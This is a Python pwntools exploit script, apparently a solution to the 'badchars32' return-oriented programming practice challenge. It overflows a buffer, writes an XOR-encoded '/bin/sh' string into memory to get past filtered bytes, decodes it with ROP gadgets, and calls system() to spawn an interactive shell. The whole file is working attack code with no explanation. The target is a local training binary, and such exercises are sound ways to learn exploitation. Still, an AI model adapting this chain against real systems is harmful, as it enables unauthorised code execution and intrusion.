from pwn import *

p = process("./badchars32")
context.log_level = 'debug'

binsh = "/bin/sh\x00"
xorbinsh = ""
mov_edip_esi = 0x08048893
pop_esi_edi = 0x08048899
pop_ebx_ecx = 0x08048896
xor_ebx_cl = 0x08048890

bss_addr = 0x0804a040
sys_addr = 0x080484e0

for i in binsh:
	xorbinsh += chr(ord(i)^2)

payload = ''
payload += "A"*44
payload += p32(pop_esi_edi)
payload += xorbinsh[:4]
payload += p32(bss_addr)
payload += p32(mov_edip_esi)

payload += p32(pop_esi_edi)
payload += xorbinsh[4:]
payload += p32(bss_addr+4)
payload += p32(mov_edip_esi)

for i in range(len(xorbinsh)):
	payload += p32(pop_ebx_ecx)
	payload += p32(bss_addr + i)
	payload += p32(2)
	payload += p32(xor_ebx_cl)

payload += p32(sys_addr)
payload += "BBBB"
payload += p32(bss_addr)

p.sendline(payload)
p.interactive()
